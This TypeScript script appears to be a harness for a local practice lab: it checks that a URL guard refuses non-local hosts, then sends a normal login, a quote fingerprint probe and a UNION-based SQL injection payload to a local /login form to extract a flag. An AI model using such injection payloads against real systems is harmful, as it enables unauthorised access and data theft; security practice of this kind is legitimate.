import { httpRequest } from './tools/http';
import { assertAllowedUrl } from './safety';

async function main() {
    // 1. allowed request
    const health = await httpRequest({ path: '/health' });
    console.log('health:', health.status, health.body);

    // 2. the wall refuses a non-local host
    try {
        assertAllowedUrl('http://example.com/');
        console.log('❌ REFUSAL FAILED — this should not print');
    } catch (e) {
        console.log('✅ refused as expected:', (e as Error).message);
    }

    // 3. the three manual probes, now driven THROUGH the tool
    const normal = await httpRequest({
        method: 'POST', path: '/login',
        form: { username: 'alice', password: 'wonderland' }
    });
    console.log('\nnormal     :', normal.status, normal.body);

    const finger = await httpRequest({
        method: 'POST', path: '/login',
        form: { username: "'", password: 'x' }
    });
    console.log('fingerprint:', finger.status, finger.body);

    const exploit = await httpRequest({
        method: 'POST', path: '/login',
        form: { username: "' UNION SELECT 1, flag FROM secrets -- ", password: 'x' }
    });
    console.log('exploit    :', exploit.status, exploit.body);
}

main().catch((err) => { console.error(err); process.exit(1); });